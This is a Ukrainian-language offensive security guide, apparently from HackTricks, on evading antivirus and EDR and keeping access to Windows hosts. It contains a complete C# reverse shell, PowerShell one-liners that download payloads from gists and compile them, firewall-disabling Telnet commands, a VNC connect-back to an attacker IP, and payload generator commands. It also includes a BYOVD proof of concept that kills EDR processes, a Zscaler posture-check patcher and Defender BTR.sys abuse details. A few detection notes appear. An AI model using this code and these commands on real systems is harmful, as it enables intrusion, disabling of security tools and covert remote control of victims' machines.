Замість того, щоб маскувати весь імплант лише під час сну, модифікований бекенд LLVM X86 може зберігати вибрані функції в XOR-маскованому вигляді, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані імена, що містять `REG_`, додає position-independent заглушки входу/виходу навколо фінального машинного коду та розміщує один спільний обробник маскування в `.text`; сигнатури на рівні вихідного коду та угода про виклики Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в бекенді

Це має відбуватися після вибору інструкцій і оптимізації, оскільки перетворення повинно охоплювати **кожну згенеровану інструкцію повернення** та знати точне розташування інструкцій x86. `MachineFunctionPass`, що працює перед виведенням, знаходить останню `MachineInstr::isReturn()`, видаляє її, щоб останній шлях переходив у доданий епілог, і замінює попередні інструкції повернення на `JMP_1 handler`. Залишайте згенероване компілятором очищення стека/кадру перед кожною інструкцією повернення; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `emitFunctionBodyEnd()` виводять заглушки для кожної функції, а `emitEndOfAsmFile()` — обробник. Символи, спільні для етапів виведення, дають змогу переходу прологу адресувати пізніший епілог; для вручну виведеного near `je` запишіть `0F 84`, а за ним — чотирибайтовий вираз MC `target - address_after_je`. Виклики й переходи до обробника натомість можна виводити як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Якщо функцію не вибрано й змін не було, pass має повертати `false`; PoC помилково повертає на цьому шляху `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує XOR-ключ і записи завдовжки 16 байтів, що містять вказівник на функцію з loader relocation та довжину, визначену під час виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, обробник читає QWORD зі зміщенням `+8` у записі, використовуючи довжину та її доповнення, і переходить до наступного запису з кроком `0x10`. Імена секцій PE мають лише вісім байтів, тому під час виконання пошук бачить `.funcmet`. Зовнішній patcher додає виконувану секцію `.stub`, зберігає старий RVA точки входу в заглушці й перенаправляє `AddressOfEntryPoint`; PIC-заглушка отримує базу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить таблицю імпортів PE32+, щоб знайти вже імпортовану `VirtualProtect`, і запускається до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється sentinel, після чого викликається кожна функція з метаданих. Пролог, який завжди залишається доступним для читання, записує початок функції в `gs:[0xF0]`, перевіряє sentinel і пропускає ще не замасковане тіло. Потім епілог використовує `call handler`; після того як обробник зберігає 13 регістрів (`0x68` байтів), адреса повернення в `[rsp+0x68]` вказує на кінець перетвореної функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл заглушка очищує sentinel і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник, щоб декодувати тіло. Останній шлях переходить у доданий епілог, а кожне попереднє повернення — безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тому після повторного маскування інструкція `ret` обробника використовує адресу повернення початкового виклику й зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює захист решти ділянки на `PAGE_EXECUTE_READWRITE`, виконує XOR для кожного байта з молодшим байтом ключа, а потім встановлює `PAGE_EXECUTE_READ`. Таким чином, той самий цикл декодує тіло під час входу та кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До показових індикаторів цієї реалізації належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ та relocated-вказівники на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до CRT, після чого — виклики через кожен вказівник із метаданих;
- однакові PIC-прологи `call`/`pop` і багато місць повернення, перенаправлених до одного обробника;
- записи в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, після яких ідуть повторювані зміни захисту через `VirtualProtect` та побайтові XOR-записи в виконувані сторінки, прив’язані до образу.

Це ухилення від сканерів пам’яті, а не криптографічний захист: у пропатченому файлі все ще міститься початкове незашифроване тіло, а налагоджувач може встановити breakpoint на `VirtualProtect` або XOR-цикл і зняти активну функцію. Однобайтовий XOR, доступні для читання метадані та фіксована межа `0x46` також спрощують відновлення офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але змінені сторінки коду є спільними для процесу. Тому одночасний або рекурсивний виклик може перемкнути інструкції, поки їх виконує інший виклик; винятки та нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати перемикання, відновлювати фактичний захист, повернутий через `lpflOldProtect`, уникати жорстко заданої довжини заглушки, перевіряти вирівнювання стека x64 для шляхів `call` і `jmp` та викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликачів відповідальність за узгодженість кешу інструкцій у разі модифікації виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Можливо, ви бачили цей екран під час завантаження з інтернету та запуску деяких виконуваних файлів.

Microsoft Defender SmartScreen — це механізм безпеки, покликаний захистити кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно використовує підхід на основі репутації: застосунки, які завантажують нечасто, викликають SmartScreen, який попереджає кінцевого користувача та не дає йому запустити файл (хоча файл усе ще можна запустити, натиснувши «Докладніше» -> «Запустити в будь-якому разі»).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, з якої їх завантажили.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають SmartScreen**.

Дуже ефективний спосіб не допустити встановлення Mark of The Web для ваших payload — упакувати їх у контейнер, наприклад ISO. Це працює, оскільки Mark-of-the-Web (MOTW) **не можна** застосувати до томів, що **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payload у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo for обходу SmartScreen шляхом пакування payloads в ISO-файли за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу програмам і системним компонентам **реєструвати події**. Однак його також можуть використовувати засоби безпеки для моніторингу та виявлення шкідливої активності.

Так само, як можна вимкнути (обійти) AMSI, можна змусити функцію **`EtwEventWrite`** процесу в user space негайно повертати керування, не реєструючи жодних подій. Для цього функцію патчать у пам’яті, щоб вона негайно повертала керування, фактично вимикаючи журналювання ETW для цього процесу.

Більше інформації можна знайти тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) та [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Завантаження C#-бінарних файлів у пам’ять відоме вже давно й досі є чудовим способом запускати інструменти post-exploitation, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде подбати лише про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) уже дають змогу виконувати C# assemblies безпосередньо в пам’яті, але є різні способи це зробити:

- **Fork\&Run**

Цей спосіб передбачає **запуск нового sacrificial process**, ін’єкцію в нього шкідливого коду post-exploitation, виконання цього коду та завершення нового процесу після цього. У такого підходу є переваги й недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого імпланта Beacon. Це означає, що якщо під час post-exploitation щось піде не так або вас виявлять, шанси на **виживання нашого імпланта значно вищі**. Недолік у тому, що **ймовірність виявлення** за допомогою **Behavioural Detections** вища.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей спосіб полягає в ін’єкції шкідливого коду post-exploitation **у власний процес**. Так можна уникнути створення нового процесу та його сканування AV, але якщо під час виконання payload щось піде не так, **ймовірність втратити beacon значно вища**, оскільки процес може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C# Assembly, прочитайте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та ознайомтеся з їхнім InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C# Assemblies **з PowerShell**. Ознайомтеся з [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео від S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, розміщеного на SMB-шарі під контролем атакувальника**.

Надавши доступ до бінарних файлів інтерпретатора та середовища на SMB-шарі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender і далі сканує скрипти, але використання Go, Java, PHP тощо дає нам **більше можливостей для обходу статичних сигнатур**. Тестування випадкових необфускованих reverse shell-скриптів цими мовами було успішним.

## TokenStomping

Token stomping змінює access token засобу безпеки, наприклад EDR або AV. Зниження привілеїв токена може залишити процес запущеним, водночас не даючи йому виконувати привілейовану перевірку чи усунення загроз.

Щоб запобігти цьому, Windows може **заборонити зовнішнім процесам** отримувати handles до токенів процесів засобів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**цій публікації в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), Chrome Remote Desktop легко встановити на ПК жертви, а потім використовувати для захоплення контролю над ним і забезпечення persistence:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім — MSI-файл для Windows, щоб завантажити його.
2. Тихо запустіть інсталятор на комп’ютері жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть Next. Майстер запропонує пройти авторизацію; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану команду, внісши необхідні зміни: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN-код без використання GUI).
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion — дуже складна тема. Іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому в зрілих середовищах практично неможливо залишитися повністю непоміченим.

У кожного середовища, з яким ви зіткнетеся, будуть свої сильні та слабкі сторони.

Наполегливо рекомендую переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати початкове уявлення про Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарного файлу**, доки **не визначить, яку саме його частину Defender** вважає шкідливою, а потім розділить файл для вас.\
Інший інструмент, який виконує **те саме, — це** [**avred**](https://github.com/dobin/avred), який також пропонує вебсервіс за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 у складі всіх версій Windows був **Telnet server**, який можна було встановити (з правами адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Зробіть так, щоб воно **запускалося** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (приховано) та вимкнути брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і щойно створений файл _**UltraVNC.ini**_ на **цільовий комп’ютер**

#### **Reverse connection**

**Атакувальник** має **запустити на своєму хості** бінарний файл `vncviewer.exe -listen 5900`, щоб підготуватися до приймання зворотного **VNC-з’єднання**. Потім на **цільовому комп’ютері** запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти непомітність, не робіть ось чого:

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc`, якщо в тій самій директорії немає `UltraVNC.ini`, інакше відкриється [вікно налаштувань](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання довідки, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть лістенер** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# reverse shell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це разом із:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### Використання компілятора C#

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання Python для створення інжекторів: приклад

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – знищення AV/EDR із простору ядра

Storm-2603 використовував невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед запуском ransomware. Інструмент постачається з **власним вразливим, але *підписаним* драйвером** і зловживає ним для виконання привілейованих операцій ядра, які не можуть заблокувати навіть служби AV із захистом Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: Файл, що записується на диск, — це `ServiceMouse.sys`, але двійковий файл насправді є легітимно підписаним драйвером `AToolsKrnl64.sys` із «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть за ввімкненої Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із user land.
3. **IOCTL, які надає драйвер**
   | Код IOCTL | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для зупинення служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю обходить захисти user-mode; код, що виконується в ядрі, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти ядра незалежно від PPL/PP, ELAM чи інших функцій посилення захисту.

Виявлення / пом’якшення
• Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *ядра* та сповіщайте, якщо драйвер завантажується зі спільного каталогу з дозволом на запис або відсутній у списку дозволених.
• Стежте за дескрипторами user-mode до користувацьких об’єктів пристроїв, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector через патчинг бінарних файлів на диску

**Client Connector** від Zscaler застосовує локальні правила оцінювання стану пристрою та використовує Windows RPC для передавання результатів іншим компонентам. Обхід повністю можливий через два слабкі рішення в дизайні:

1. Оцінювання стану відбувається **цілком на стороні клієнта** (на сервер надсилається булеве значення).
2. Внутрішні кінцеві точки RPC лише перевіряють, чи **підписаний Zscaler** виконуваний файл, що встановлює з’єднання (через `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Патчингом чотирьох підписаних бінарних файлів на диску** можна нейтралізувати обидва механізми:

| Бінарний файл | Початкову логіку змінено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка успішна |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може підключитися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Пропускаються |

Мінімальний фрагмент patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану відображаються **зеленими/відповідними вимогам**.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC іменованих каналів (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як кілька патчів байтів дають змогу обійти рішення щодо довіри, які приймаються суто на боці клієнта, і прості перевірки підписів.

## Зловживання довіреною функціональністю Microsoft Defender `BTR.sys`

Драйвер **Boot-Time Removal** у Defender — корисний приклад, що відрізняється від класичного BYOVD. `BTR.sys` — це легітимний компонент виправлення системи, підписаний Microsoft, без помилки пошкодження пам’яті та інтерфейсу IOCTL; натомість, отримавши права адміністратора та `SeLoadDriverPrivilege`, оператор може підробити його приватну транзакцію виправлення й отримати передбачені операції з файлами/реєстром на Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початкового доступу чи підвищення привілеїв**, причому драйвер можна витягти з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, а не імпортувати помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender зберігає ресурс у файлі з випадковою назвою `[a-z]{8}.sys` і реєструє службу ядра з подібною назвою. `DriverEntry` читає значення `Args` служби, відкриває вказаний NTFS ADS, розшифровує та перевіряє список дій, записує зворотний зв’язок і після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб вивантажити драйвер, а не залишити його резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один blob, зашифрований RC4. У проаналізованих збірках використовується один і той самий фіксований 256-байтовий ключ, тому шифрування не є межею авторизації. Коректний відкритий текст містить 24-байтовий глобальний заголовок (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, похідний від payload), за яким ідуть шлях зворотного зв’язку у форматі UTF-16 із нульовим термінатором та довільна кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що закінчуються **рівно чотирма байтами NUL**. Кожен регіон заголовка/даних перевіряється окремо за допомогою CRC-32 з поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); для кожного регіону стан CRC скидається.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій відкривають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[шлях UTF-16]` | Видалити файл, зокрема заблокований |
| 2 | `[шлях UTF-16]` | Видалити порожній каталог |
| 3 | `[Flags][джерело][призначення]` | Перемістити файл у захищений шлях, вибраний атакувальником; порожнє призначення означає видалення |
| 4 | `[Flags][шлях до ключа]` | Рекурсивно видалити ключ реєстру |
| 5 | `[Flags][шлях до ключа + "\\" + значення]` | Видалити значення реєстру |
